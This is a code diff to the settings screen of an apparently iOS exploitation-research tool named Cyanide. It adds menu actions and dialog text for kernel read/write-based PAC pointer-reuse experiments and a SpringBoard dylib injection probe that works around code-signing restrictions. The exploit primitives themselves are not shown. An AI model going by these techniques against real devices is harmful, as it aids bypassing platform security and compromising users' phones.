+                        ? "yes" : "no");
+                log_user("[PAC_CROSS_TASK] JSON: %s\n",
+                    [report[@"reportPath"] UTF8String] ?: "unavailable");
+                log_session_end();
+                settings_release_actions_lock();
+                settings_notify_remote_call_state_changed();
+                settings_post_actions_complete_async(success,
+                    success
+                        ? @"Physical cross-task PAC canary passed."
+                        : [NSString stringWithFormat:
+                            @"Cross-task PAC canary finished: %@.",
+                            result.length ? result : @"unknown-result"]);
+            });
+    });
+}
+
+void settings_run_physical_rx_probe_action(void)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        if (!settings_try_claim_actions_lock(
+                "physical SpringBoard execution probe",
                 "[RX_PROBE] Another action is already running.")) {
             settings_post_actions_complete_async(
                 NO, @"Physical RX probe blocked: another action is running.");
@@ -2679,19 +3286,37 @@ static void settings_run_physical_rx_probe_action(void)
             return;
         }
 
-        log_user("[RX_PROBE] Testing PT_ATTACHEXC and one private RX page in SpringBoard. Spotlight is not opened or contacted. A successful attach saves the JSON, forces one respring, parks KRW, and terminates Cyanide to clear both temporary debug allowances.\n");
+        log_user("[RX_PROBE] Testing the known-denied baseline PT_ATTACHEXC as a control, then using the proven identity/KRW transport to ask SpringBoard to self-trace. No credential or MAC-label is written. If CS_DEBUGGED appears, the exact executable grant and inert dylib marker are tested. Spotlight is not opened or contacted.\n");
         CNDPhysicalCSAllowInvalidProbeRun(
             ^(NSDictionary<NSString *, id> *report) {
                 NSString *result = settings_lsreg_text(report[@"result"]);
                 BOOL success = [result isEqualToString:
-                    @"success-private-rx-executed"];
-                log_user("[RX_PROBE] completed result=%s attach=%s cs-invalid=%s rx=%s springboard-reset=%s session-closed=%s\n",
+                    @"success-private-rx-executed"] ||
+                    [result isEqualToString:
+                    @"success-springboard-dylib-injected-resident"] ||
+                    [result isEqualToString:
+                    @"success-springboard-signed-vnode-executed"];
+                log_user("[RX_PROBE] completed result=%s baseline-attach=%s amfi-borrow-installed=%s amfi-borrow-restored=%s borrowed-attach=%s app-attach=%s parent-attach=%s target-self-trace=%s detached=%s cs-allowance=%s cs-invalid=%s rx=%s dylib=%s resident=%s signed-vnode=%s dlerror=%s springboard-reset=%s session-closed=%s\n",
                     result.UTF8String ?: "unknown-result",
+                    [report[@"baselineAttachDetachCompleted"] boolValue] ? "yes" : "no",
+                    [report[@"amfiBorrowInstalled"] boolValue] ? "yes" : "no",
+                    [report[@"amfiBorrowRestored"] boolValue] ? "yes" : "no",
+                    [report[@"amfiBorrowAttachDetachCompleted"] boolValue] ? "yes" : "no",
                     [report[@"attachDetachCompleted"] boolValue] ? "yes" : "no",
+                    [report[@"launchdAttachCompleted"] boolValue] ? "yes" : "no",
+                    [report[@"selfTraceAttempted"] boolValue] ? "yes" : "no",
+                    [report[@"selfTraceCleanupVerified"] boolValue] ? "yes" : "no",
+                    [report[@"codeSignAllowanceObserved"] boolValue] ? "yes" : "no",
                     [report[@"csAllowInvalidObserved"] boolValue] ? "yes" : "no",
                     [report[@"rxNonceResult"] UTF8String] ?: "-",
+                    [report[@"dylibProbeExecutionSuccess"] boolValue] ? "yes" : "no",
+                    [report[@"dylibProbeLeftResident"] boolValue] ? "yes" : "no",
+                    [report[@"signedVnodeExecutionSuccess"] boolValue] ? "yes" : "no",
+                    [report[@"dylibProbeLoadError"] UTF8String] ?: "-",
                     [report[@"springBoardFinalResetProven"] boolValue] ? "yes" : "no",
-                    [report[@"remoteSessionClosed"] boolValue] ? "yes" : "no");
+                    ([report[@"remoteSessionClosed"] boolValue] ||
+                     [report[@"dylibProbeSessionClosed"] boolValue])
+                        ? "yes" : "no");
                 log_user("[RX_PROBE] JSON: %s\n",
                     [report[@"reportPath"] UTF8String] ?: "unavailable");
                 if (stoppedWatcher) {
@@ -2703,7 +3328,7 @@ static void settings_run_physical_rx_probe_action(void)
                 settings_post_actions_complete_async(
                     success,
                     [NSString stringWithFormat:
-                        @"Physical RX probe finished: %@.",
+                        @"Physical SpringBoard execution probe finished: %@.",
                         result.length ? result : @"unknown-result"]);
             });
     });
@@ -17647,7 +18272,7 @@ static _CyanideMailDelegate *_cyanide_mail_delegate(void) {
         return (NSInteger)[self rowsForSection:self.underlyingSection].count;
     }
     switch ((RootSection)section) {
-        case RootSectionActions:        return 4;
+        case RootSectionActions:        return 6;
         case RootSectionAbout:          return 6;
         case RootSectionWarning:        return 0;
         case RootSectionCount:          return 0;
@@ -20171,34 +20796,86 @@ void cyanide_present_contact(UIViewController *host)
             color  = UIColor.systemBlueColor;
             cell.textLabel.text = @"Check for Updates";
         } else if (indexPath.row == 4) {
-            rowEnabled = supported && !g_settings_actions_running &&
-                !iconRedirectActive;
-            symbol = @"checkmark.shield.fill";
-            color = UIColor.systemIndigoColor;
-            cell.textLabel.text = @"Test Icon Registration";
-            cell.detailTextLabel.text = iconRedirectActive
-                ? @"Restore icon proof first"
-                : (rowEnabled ? @"No-op baseline through stock installd"
-                              : (supported ? @"Another action is running" : nil));
+            if (cnd_lab_vphone_guest()) {
+                NSString *supportReason = nil;
+                BOOL exactTarget =
+                    CNDLabThreadCallPACBoundaryIsSupported(&supportReason);
+                BOOL running = CNDLabThreadCallPACBoundaryIsRunning();
+                rowEnabled = !g_settings_actions_running && !running;
+                symbol = @"timer.circle.fill";
+                color = UIColor.systemIndigoColor;
+                cell.textLabel.text = running
+                    ? @"VM thread_call Probe Running…"
+                    : @"Run VM thread_call PAC Probe";
+                if (g_settings_actions_running) {
+                    cell.detailTextLabel.text = @"Another action is running";
+                } else if (!exactTarget) {
+                    cell.detailTextLabel.text = supportReason;
+                } else {
+                    cell.detailTextLabel.text =
+                        @"Read-only mk_timer boundary • no kcall";
+                }
+            } else {
+                NSString *supportReason = nil;
+                BOOL exactTarget = CNDPhysicalPACIdentityCanaryIsSupported(
+                    &supportReason);
+                rowEnabled = exactTarget && !g_settings_actions_running &&
+                    !CNDPhysicalPACIdentityCanaryIsRunning();
+                symbol = @"checkmark.shield.fill";
+                color = UIColor.systemIndigoColor;
+                cell.textLabel.text = CNDPhysicalPACIdentityCanaryIsRunning()
+                    ? @"Physical PAC Validator Running…"
+                    : @"Run Physical PAC Validator";
+                if (!exactTarget) {
+                    cell.detailTextLabel.text = supportReason;
+                } else if (g_settings_actions_running) {
+                    cell.detailTextLabel.text = @"Another action is running";
+                } else {
+                    cell.detailTextLabel.text =
+                        @"KRW saved-state/JOP proof • no kcall";
+                }
+            }
         } else if (indexPath.row == 5) {
-            rowEnabled = supported && !g_settings_actions_running &&
-                !iconRedirectActive;
-            symbol = @"photo.badge.arrow.down.fill";
-            color = UIColor.systemOrangeColor;
-            BOOL providerProof = remote_call_lab_backend_opted_in() ||
-                cnd_lab_vphone_guest();
-            cell.textLabel.text = providerProof
-                ? @"Publish eBay Marked Icon"
-                : [NSString stringWithFormat:@"Test %@ Icon Proof",
-                   settings_icon_redirect_target_name()];
-            cell.detailTextLabel.text = iconRedirectActive
-                ? @"Restore the pending icon proof first"
-                : (rowEnabled ? (providerProof
-                    ? (remote_call_lab_backend_opted_in()
-                        ? @"One-shot iconservicesagent publisher"
-                        : @"VM detected; enable the RemoteCall lab transport")
-                    : @"In-place fallback file + stock installd")
-                              : (supported ? @"Another action is running" : nil));
+            if (cnd_lab_vphone_guest()) {
+                NSString *supportReason = nil;
+                BOOL exactTarget =
+                    CNDLabThreadCallPACBoundaryIsSupported(&supportReason);
+                BOOL running = CNDLabThreadCallPACBoundaryIsRunning();
+                rowEnabled = exactTarget && !g_settings_actions_running &&
+                    !running;
+                symbol = @"pencil.and.outline";
+                color = UIColor.systemPurpleColor;
+                cell.textLabel.text = running
+                    ? @"VM PAC Reuse Probe Running…"
+                    : @"Run VM thread_call PAC Reuse";
+                if (!exactTarget) {
+                    cell.detailTextLabel.text = supportReason;
+                } else if (g_settings_actions_running) {
+                    cell.detailTextLabel.text = @"Another action is running";
+                } else {
+                    cell.detailTextLabel.text =
+                        @"Signed adapter + signed target • controlled x0";
+                }
+            } else {
+                NSString *supportReason = nil;
+                BOOL exactTarget = CNDPhysicalCSAllowInvalidProbeIsSupported(
+                    &supportReason);
+                rowEnabled = exactTarget && !g_settings_actions_running &&
+                    !CNDPhysicalCSAllowInvalidProbeIsRunning();
+                symbol = @"cpu.fill";
+                color = UIColor.systemPurpleColor;
+                cell.textLabel.text = CNDPhysicalCSAllowInvalidProbeIsRunning()
+                    ? @"SpringBoard Probe Running…"
+                    : @"Run SpringBoard Injection Probe";
+                if (!exactTarget) {
+                    cell.detailTextLabel.text = supportReason;
+                } else if (g_settings_actions_running) {
+                    cell.detailTextLabel.text = @"Another action is running";
+                } else {
+                    cell.detailTextLabel.text =
+                        @"Identity self-trace • SpringBoard dlopen";
+                }
+            }
         } else if (indexPath.row == 6) {
             rowEnabled = supported && !g_settings_actions_running &&
                 iconRedirectActive;
@@ -21876,48 +22553,100 @@ void cyanide_present_contact(UIViewController *host)
         } else if (indexPath.row == 3) {
             [[UpdateChecker shared] checkForUpdatesManuallyFrom:self];
         } else if (indexPath.row == 4) {
+            if (cnd_lab_vphone_guest()) {
+                UIAlertController *ac = [UIAlertController
+                    alertControllerWithTitle:@"Run VM thread_call PAC Probe?"
+                                     message:@"Exact iOS 26.0 / 23A341 vPhone diagnostic. Cyanide acquires or reuses the lab KRW provider, creates one ordinary Mach timer, and uses kernel reads to bind the timer name to its exact ipc_port, strip the port label's data PAC, and verify the embedded idle thread_call's IA/0x73d8 callback, parameters, flags, ownership, and lifecycle fields against the REA/shipped-instruction profile. It never arms the timer and uses no kernel write or kcall; the timer is destroyed before completion."
+                              preferredStyle:UIAlertControllerStyleAlert];
+                [ac addAction:[UIAlertAction actionWithTitle:@"Cancel"
+                                                       style:UIAlertActionStyleCancel
+                                                     handler:nil]];
+                __weak typeof(self) weakSelf = self;
+                [ac addAction:[UIAlertAction actionWithTitle:@"Run Probe"
+                                                       style:UIAlertActionStyleDefault
+                                                     handler:^(UIAlertAction *_) {
+                    __strong typeof(weakSelf) strongSelf = weakSelf;
+                    if (!strongSelf) return;
+                    [strongSelf presentActivityLogWithCompletion:^{
+                        settings_run_lab_thread_call_pac_boundary_action();
+                    }];
+                }]];
+                settings_present_controller(ac, self);
+                return;
+            }
             UIAlertController *ac = [UIAlertController
-                alertControllerWithTitle:@"Run Baseline Registration?"
-                                 message:@"This captures kslop's exact current signed identity, establishes live KRW, and asks stock installd to re-register that unchanged dictionary. It does not replace an icon or modify plist or app-bundle files."
+                alertControllerWithTitle:@"Run Physical PAC Validator?"
+                                 message:@"Exact physical iPhone17,2 / 23A341 diagnostic. Cyanide acquires or reuses validated KRW and creates one sacrificial worker thread. It binds the delivered rights to that exact thread, snapshots its upcb/JOP state through KRW, applies a marked x16 with retained x17 and converted PC/LR, then snapshots the same state again while the resumed worker spins without making a syscall. No fork, kcall, target daemon, executable page, kernel write, or persistent mutation is used."
                           preferredStyle:UIAlertControllerStyleAlert];
             [ac addAction:[UIAlertAction actionWithTitle:@"Cancel"
                                                    style:UIAlertActionStyleCancel
                                                  handler:nil]];
             __weak typeof(self) weakSelf = self;
-            [ac addAction:[UIAlertAction actionWithTitle:@"Run Test"
+            [ac addAction:[UIAlertAction actionWithTitle:@"Run Canary"
                                                    style:UIAlertActionStyleDefault
                                                  handler:^(UIAlertAction *_) {
                 __strong typeof(weakSelf) strongSelf = weakSelf;
                 if (!strongSelf) return;
                 [strongSelf presentActivityLogWithCompletion:^{
-                    settings_run_lsreg_baseline_action();
+                    settings_run_physical_pac_identity_canary_action();
                 }];
             }]];
             settings_present_controller(ac, self);
         } else if (indexPath.row == 5) {
-            NSString *targetName = settings_icon_redirect_target_name();
-            BOOL providerProof = remote_call_lab_backend_opted_in() ||
-                cnd_lab_vphone_guest();
+            if (cnd_lab_vphone_guest()) {
+                UIAlertController *ac = [UIAlertController
+                    alertControllerWithTitle:@"Run VM thread_call PAC Reuse?"
+                                     message:@"Exact iOS 26.0 / 23A341 vPhone experiment. Cyanide harvests one kernel-owned IA/0x73d8-signed braaz-x1 adapter and one kernel-owned IA-zero-signed target. It refuses to arm unless all three exact target gates select the read-only early return. After verifying one queued Mach timer, it installs the signed target, signed adapter, and fixed x0 canary in a safe order. Success requires the queue to drain with unchanged gates and fields. Cyanide then restores the original callback and parameters, clears the timer through mk_timer_cancel, repairs only the unsigned active count, verifies the destroyable state, and destroys it. KRW is used; kcall is not."
+                              preferredStyle:UIAlertControllerStyleAlert];
+                [ac addAction:[UIAlertAction actionWithTitle:@"Cancel"
+                                                       style:UIAlertActionStyleCancel
+                                                     handler:nil]];
+                __weak typeof(self) weakSelf = self;
+                [ac addAction:[UIAlertAction actionWithTitle:@"Run PAC Reuse"
+                                                       style:UIAlertActionStyleDefault
+                                                     handler:^(UIAlertAction *_) {
+                    __strong typeof(weakSelf) strongSelf = weakSelf;
+                    if (!strongSelf) return;
+                    [strongSelf presentActivityLogWithCompletion:^{
+                        settings_run_lab_thread_call_pac_reuse_action();
+                    }];
+                }]];
+                [ac addAction:[UIAlertAction actionWithTitle:@"Run PM Harvest"
+                                                       style:UIAlertActionStyleDefault
+                                                     handler:^(UIAlertAction *_) {
+                    __strong typeof(weakSelf) strongSelf = weakSelf;
+                    if (!strongSelf) return;
+                    [strongSelf presentActivityLogWithCompletion:^{
+                        settings_run_lab_thread_call_pm_harvest_action();
+                    }];
+                }]];
+                [ac addAction:[UIAlertAction actionWithTitle:@"Run PM IOUserServer"
+                                                       style:UIAlertActionStyleDefault
+                                                     handler:^(UIAlertAction *_) {
+                    __strong typeof(weakSelf) strongSelf = weakSelf;
+                    if (!strongSelf) return;
+                    [strongSelf presentActivityLogWithCompletion:^{
+                        settings_run_lab_pm_cross_class_action();
+                    }];
+                }]];
+                settings_present_controller(ac, self);
+                return;
+            }
             UIAlertController *ac = [UIAlertController
-                alertControllerWithTitle:providerProof
-                    ? @"Publish eBay IconServices Response?"
-                    : [NSString stringWithFormat:@"Test %@ Icon Proof?", targetName]
-                                 message:providerProof
-                    ? @"Apply only; Restore is never invoked. kslop renders transparent marked IFImage.data and publishes it through one scoped iconservicesagent session. A direct generateImageWithDescriptor: request triggers exactly one stock-first replacement: the original generator supplies the genuine validation token and may supply a pre-store UUID; otherwise the unmodified outer transaction assigns the canonical UUID, which kslop binds only from the exact data/token-matched cache/store response. After the publisher IMP and temporary map are removed and exact .isdata bytes verify, kslop installs the process-local transparent presentation route. eBay's bundle and LaunchServices remain untouched."
-                    : [NSString stringWithFormat:@"kslop will capture %@'s current bundle path, registration, real Info.plist, and declared fallback icon; durably journal both original files/metadata; then modify the existing Info.plist and icon vnodes in place with overwrite_system_file(). If no usable legacy file exists, it will create one guarded fallback instead. It removes only the phone primary CFBundleIconName, rebuilds registration from the mutated bundle URL, and verifies exact file/object readback plus the effective LaunchServices record. Restore after the visual and relaunch checks.", targetName]
+                alertControllerWithTitle:@"Run SpringBoard Injection Probe?"
+                                 message:@"Exact iPhone17,2 / 23A341 executable-admission test. After recording the known-denied external attach, Cyanide uses its proven identity/KRW RemoteCall transport to ask SpringBoard to invoke PT_TRACE_ME on itself. No credential or MAC-label is modified. If the normal kernel transition marks SpringBoard debugged, the same identity-bound session consumes an executable sandbox grant, dlopens the inert embedded dylib, and invokes its challenge/response marker. SpringBoard is then replaced to clear all temporary exception and tracing state. Spotlight is never contacted."
                           preferredStyle:UIAlertControllerStyleAlert];
             [ac addAction:[UIAlertAction actionWithTitle:@"Cancel"
                                                    style:UIAlertActionStyleCancel
                                                  handler:nil]];
             __weak typeof(self) weakSelf = self;
-            [ac addAction:[UIAlertAction
-                actionWithTitle:providerProof ? @"Publish" : @"Run Test"
-                          style:UIAlertActionStyleDefault
-                        handler:^(UIAlertAction *_) {
+            [ac addAction:[UIAlertAction actionWithTitle:@"Run Probe"
+                                                   style:UIAlertActionStyleDefault
+                                                 handler:^(UIAlertAction *_) {
                 __strong typeof(weakSelf) strongSelf = weakSelf;
                 if (!strongSelf) return;
                 [strongSelf presentActivityLogWithCompletion:^{
-                    settings_run_icon_redirect_action(YES, NO);
+                    settings_run_physical_rx_probe_action();
                 }];
             }]];
             settings_present_controller(ac, self);
